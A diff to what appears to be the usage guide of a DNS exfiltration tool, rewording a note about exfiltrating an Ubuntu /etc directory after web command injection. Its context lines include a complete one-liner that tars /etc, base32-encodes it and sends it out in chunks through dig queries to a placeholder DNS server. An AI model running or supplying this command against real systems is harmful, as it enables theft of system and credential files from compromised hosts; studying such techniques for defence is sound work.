@@ -63,7 +63,7 @@ Decode/unzip the file:
 
 ### Exfiltrate a compressed tar archive of a directory:
 
-Note that exfiltrating /etc on an Ubuntu Linux system worked perfectly (but took a while). It took 35 minutes, requiring 45,382 DNS requests, resulting in a 1.8 megabyte tar.gz file. Needless to say: the files/directories contained in the archive are restricted by the permissions of the running user. For command injection on web sites (using an account such as apache or www-data), many files/directories will likely be missing.
+Note that exfiltrating /etc on an Ubuntu Linux system worked (but was slow). It took 35 minutes, requiring 45,382 DNS requests, resulting in a 1.8 megabyte tar.gz file. Needless to say: the files/directories contained in the archive are restricted by the permissions of the running user. For command injection on web sites (using an account such as apache or www-data), many files/directories will likely be missing.
 
 ```
 tar czf - /etc | base32 -w 63 | tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
